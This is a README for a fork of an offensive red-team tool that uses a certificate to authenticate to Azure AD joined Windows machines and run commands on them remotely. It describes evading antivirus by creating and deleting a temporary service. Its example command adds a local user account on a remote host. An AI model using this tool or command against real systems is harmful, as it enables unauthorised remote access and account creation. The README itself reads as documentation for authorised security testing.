A fork of the Pass the Certificate tool by Mor Rubin: https://github.com/morRubin/AzureADJoinedMachinePTC

The original tool invokes remcomsvc which is detected as malicious by almost any vendor.
The tool now simply creates a service with the given command, executes it and deletes the service.
** Made for authorized Red Team engagements / experiments only! use at your own risk ****

## Installation
The code is compatible with Python 3.6+
Download the repository from GitHub, install the dependencies and you should be good to go

```
pip3 install impacket minikerberos cryptography==3.1.1 pyasn1
```

## Usage

```
Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip
               REMOTEIP --command COMMAND
```

## Example

```
Main.py --usercert "p2pcert.pfx" --certpass Aa123456 --remoteip 192.168.47.192 --command "net user test Aa123456 /add"
```

## License
MIT

## Credits
* [Mor Rubin] for the amazing research and authentication implementation
